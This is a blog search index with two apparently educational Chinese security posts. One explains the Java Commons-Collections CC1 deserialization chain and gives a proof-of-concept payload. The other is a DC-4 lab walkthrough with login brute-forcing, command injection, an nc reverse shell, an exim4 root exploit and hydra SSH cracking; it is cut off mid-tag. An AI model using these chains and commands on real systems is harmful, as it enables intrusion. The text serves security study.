<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CC1</title>
    <link href="/2024/09/08/CC%E9%93%BE/"/>
    <url>/2024/09/08/CC%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h2><p>​已经一年没更博客了，回看一年前的博客，不禁感受到那个青涩的自己。<br>​随着能力的增长和眼界的开阔，我的想法也在不断的变化。然而，珍惜时间和热爱生活始终是不变的主旋律，即使生活非常的残酷。</p><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>使用反射进行命令执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;<span class="hljs-comment">//获取Runtime的class对象</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>);<span class="hljs-comment">//调用getMethod方法，来借机获取getRuntime方法</span><br><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> getRuntimeMethod.invoke(<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>);<span class="hljs-comment">//实现也就是调用getRuntime方法来获取Runtime的实例，其中getRuntime是静态函数所以传空参</span><br>r.exec(<span class="hljs-string">&quot;calc&quot;</span>);<span class="hljs-comment">//调用</span><br></code></pre></td></tr></table></figure><p>这里讲解一下反射，首先搞清楚每一步为什么这么去做？</p><p>Class c &#x3D; Runtime.class<br>这里是获取Runtime类的class对象，每一个类都有一个class对象与之对应，这个Class对象包含了该类的所有元数据，通过这个Class对象可以获取类的属性、方法、构造函数等信息</p><p>Method getRuntimeMethod &#x3D; c.getMethod(“getRuntime”,null)<br>这里调用getMethod这个方法来获取getRuntinme方法。<br>getMethod方法是Class类的public方法，此方法可以被任意类的对象调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Method <span class="hljs-title function_">getMethod</span><span class="hljs-params">(String name, Class&lt;?&gt;... parameterTypes)</span><br></code></pre></td></tr></table></figure><p>这里可以看到，第一个传参是要获取的方法名，第二个参数是目标方法的参数类型</p><p>Runtime r &#x3D; getRuntimeMethod.invoke(null,null);<br>这里是实现获取的Method对象<br>invoke方法是Method类里面的public方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object obj, Object... args)</span><br></code></pre></td></tr></table></figure><p>第一个参数是哪个对象实例调用此方法，第二个参数是此方法传入的参数。<br>这里第一个参数为什么为null，因为getRuntime是一个静态方法。静态方法不需要实例对象来调用。静态方法可以通过类名调用。</p><p>r.exec(“calc”);<br>Runtime的实例对象调用自己类中的exec方法调用计算器</p><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><p>我们分析这些利用链通常都是从带有危险方法开始寻找，然后往上查找其他哪些类的方法调用了这个危险方法，以此回溯到重写了readObject方法的类即可构造出一个完整的利用链。</p><p>我们使用Runtime.getRuntime().exec(“calc”)作为演示代码</p><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p>InvokerTransformer这个类存在可以命令执行的恶意方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iMethodName = methodName;<br>        iParamTypes = paramTypes;<br>        iArgs = args;<br>    &#125;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);<br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>&#125;&#125;<br></code></pre></td></tr></table></figure><p>这里两个public方法（InvokerTranformer()、tranform()）通过反射可以进行命令执行</p><p>直接命令执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span>Runtime.getRuntime();<br>r.exec(<span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure><p>InvokerTranformer()、tranform()实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Runtime r= Runtime.getRuntime();<br><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>invokerTransformer.transforme(r);<br></code></pre></td></tr></table></figure><h3 id="checkSetValue"><a href="#checkSetValue" class="headerlink" title="checkSetValue"></a>checkSetValue</h3><p>TransformedMap类继承了AbstractInputCheckedMapDecorator类</p><p>checkSetValue方法调用了transform方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer valueTransformer;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>    &#125;<span class="hljs-comment">//decorate是一个装饰品，当使用setValue处理map时会调用Transformer对其处理</span><br><br><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> &#123;<span class="hljs-comment">//这里是protected</span><br>        <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="setValue"><a href="#setValue" class="headerlink" title="setValue"></a>setValue</h3><p>AbstractInputCheckedMapDecorator类</p><p>setValue方法调用了checkValue</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object value)</span> &#123;<br>            value = parent.checkSetValue(value);<br>            <span class="hljs-keyword">return</span> entry.setValue(value);<br>        &#125;<br></code></pre></td></tr></table></figure><p>此处我们还是需要构造出invokerTransformer.tranform()</p><p>这里我们就用转换器对其操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;Object,Object&gt;map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map.put(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<span class="hljs-comment">//因为下面会将map进行取出操作，所以必须有键值，map的值可有可无，</span><br><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>Map&lt;Object,Object&gt; decorate =TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br><span class="hljs-keyword">for</span>(Map.Entry aaa:decorate.entrySet())&#123;<br>    aaa.setValue(Runtime.getRuntime);<span class="hljs-comment">//这里只要对map进行操作就会在操作之前调用invokerTransformer。类比为aaa.invokerTransformer.setValue</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p>AnnotationInvocationHandler类调用了setValue方法，这里也就是为什么cc1链有版本限制了，AnnotationInvocationHandler是1.8.0.65这个版本才有问题</p><p>这个类重写了readObject方法，所以是我们的入口点，现在开始看如何构造利用链</p><h4 id="该类的构造函数"><a href="#该类的构造函数" class="headerlink" title="该类的构造函数"></a>该类的构造函数</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;<br>        <span class="hljs-built_in">this</span>.type = type; <span class="hljs-comment">//获取一个class对象</span><br>        <span class="hljs-built_in">this</span>.memberValues = memberValues;<span class="hljs-comment">//传入一个map</span><br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="重写readObject"><a href="#重写readObject" class="headerlink" title="重写readObject"></a>重写readObject</h4><p>这里看起来就头大，我们来逐一分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br><br>        <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(type);<span class="hljs-comment">//getInstance是用来获取一个实例的方法</span><br>        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<span class="hljs-comment">//获取注解的成员及类型</span><br><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<span class="hljs-comment">//获取map的键</span><br>            Class&lt;?&gt; memberType = memberTypes.get(name);<span class="hljs-comment">//获取成员名，且值为map的键</span><br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">//不为空</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<span class="hljs-comment">//获取map的值</span><br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<span class="hljs-comment">//检测对象是否为指定类的实例</span><br>                    memberValue.setValue(<span class="hljs-comment">//利用点</span><br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>细节在上面都分析了，接下来还有几个问题，<br>1、setValue里面的值不是我们可控的，这里我们怎么传参呢？<br>2、Runtime对象实际上是无法序列化的，无法传入</p><p>该类未定义类型，默认default类型，需要利用反射获取</p><p>class AnnotationInvocationHandler implements InvocationHandler, Serializable {}</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<span class="hljs-comment">//类加载</span><br><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<span class="hljs-comment">//获取构造函数。这里注意和getConstructor区分（只能获取公有构造函数），getDeclaredConstructor能获取私有构造函数</span><br>constructor.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-comment">//如果构造函数是私有的，设置为可以访问的true</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, decorate);<span class="hljs-comment">//将构造函数进行初始化</span><br></code></pre></td></tr></table></figure><h3 id="ChainTransformer"><a href="#ChainTransformer" class="headerlink" title="ChainTransformer"></a>ChainTransformer</h3><p>由于Runtime对象无法序列化传入，我们使用反射,再来分析下InvokerTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;<br>        iMethodName = methodName;<br>        iParamTypes = paramTypes;<br>        iArgs = args;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);<span class="hljs-comment">//iMethodName是要获取的方法名</span><br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<span class="hljs-comment">//这里input是传入的类，method是要实现的方法</span><br></code></pre></td></tr></table></figure><p><strong>我们只能传入Runtime.class（可序列化），Runtime的class对象可以获取Runtime类的方法并实现，而Runtime.class能调用的是getmethod方法，所以我们传入的参数是getMethod。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span>(Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span>(Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;).transform(getRuntimeMethod);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br></code></pre></td></tr></table></figure><p>ChainTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iTransformers = transformers;<br>    &#125;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br>            object = iTransformers[i].transform(object);<br>        &#125;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这里需要ChainTransformer调用transform方法才能启动链式结构，但是setValue出的传参我们无法控制，Runtime.class在哪里传入呢？我们只能在ChainedTransformed处传参。利用ContantTransformer函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iConstant = constantToReturn;<br>    &#125;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">return</span> iConstant;<br>    &#125;<span class="hljs-comment">//这里我们注意，无论ConstantTransformer传入什么参数，我们都可以将其原封不动的输出</span><br></code></pre></td></tr></table></figure><p>代入链式结构</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br></code></pre></td></tr></table></figure><h3 id="最终poc"><a href="#最终poc" class="headerlink" title="最终poc"></a>最终poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>         HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, decorate);<br></code></pre></td></tr></table></figure><p>流程图</p><p><img src="/img/CC1.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-4</title>
    <link href="/2023/09/06/DC-4/"/>
    <url>/2023/09/06/DC-4/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-4靶场"><a href="#DC-4靶场" class="headerlink" title="DC-4靶场"></a>DC-4靶场</h1><p>目前能力有限，也只是跟着网上的大佬进行一个靶场的复现。靶场链接<a href="https://www.[vulnhub](https://so.csdn.net/so/search?q=vulnhub&spm=1001.2101.3001.7020).com/entry/dc-4,313/">https://www.[vulnhub](https://so.csdn.net/so/search?q=vulnhub&amp;spm=1001.2101.3001.7020).com/entry/dc-4,313/</a></p><p>靶场下载后设置为nat模式，方便进行使用，这里我kali和靶场都是nat模式，在同一网段下<br><img src="/img/DC-4-1.png" srcset="/img/loading.gif" lazyload><br>话不多说nmap直接开扫nmap -sP  192.168.59.* 或者 nmap -sP 192.168.59.0&#x2F;24<br><img src="/img/DC-4-1.png" srcset="/img/loading.gif" lazyload><br>这里发现主机192.168.59.152<br>继续nmap扫描端口sudo nmap -sS 192.168.59.152<br><img src="/img/DC-4-3.png" srcset="/img/loading.gif" lazyload><br>发现80 22端口，这里我们直接访问页面<br><img src="/img/DC-4-4.png" srcset="/img/loading.gif" lazyload><br>使用Wappalyzer进行查看发现未使用什么cms，只是一个简单的登录框，接下来使用御剑进行目录爆破<br><img src="/img/DC-4-5.png" srcset="/img/loading.gif" lazyload><br>这里发现全部重定向到index.php，burpsuite抓包进行查看<br><img src="/img/DC-4-6.png" srcset="/img/loading.gif" lazyload><br>登录框尝试SQL注入未成功<br><img src="/img/DC-4-7.png" srcset="/img/loading.gif" lazyload><br>接下来进行一个正常爆破，通常默认用户名是admin，再次进行爆破，最后发现密码是happy<br>进入后台感觉有点奇怪，进行抓包，修改radio为ip add,应该是命令执行<br><img src="/img/DC-4-8.png" srcset="/img/loading.gif" lazyload><br>既然可以命令执行，那么我们进行nc反弹<br>kali命令nc -lvnp 8888监听端口 靶机命令nc 192.168.59.146 8888 -e -&#x2F;bin&#x2F;bash<br><img src="/img/DC-4-9.png" srcset="/img/loading.gif" lazyload><br>输入命令python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”变成交互shell</p><h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p><strong>suid提权</strong><br>接下来我们使用suid提权，命令为find &#x2F; -user root -perm -4000 -print2&gt;&#x2F;dev&#x2F;null，发现exim4文件查看版本为4.89<br><img src="/img/DC-4-10.png" srcset="/img/loading.gif" lazyload><br>查询searchsploit exim4发现漏洞库<br><img src="/img/DC-4-11.png" srcset="/img/loading.gif" lazyload><br>使用命令systemctl start apache2.service开启apache服务，然后将文件复制到目录下<br><img src="/img/DC-4-12.png" srcset="/img/loading.gif" lazyload><br>我们尝试直接下载发现权限不够，移到tmp目录下进行下载<br><img src="/img/DC-4-13.png" srcset="/img/loading.gif" lazyload><br><img src="/img/DC-4-14.png" srcset="/img/loading.gif" lazyload><br>使用命令进行执行成功变成root权限，最终可以在root目录下发现flag<br><img src="/img/DC-4-15.png" srcset="/img/loading.gif" lazyload></p><h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>尝试进入root目录，权限不够，一顿操作发现jim文件下面有密码字典<br><img src="/img/DC-4-16.png" srcset="/img/loading.gif" lazyload><br>密码字典保存到1.txt尝试进行jim用户爆破，使用命令hydra -l jim -P 1.txt 192.168.59.152 ssh<br><img 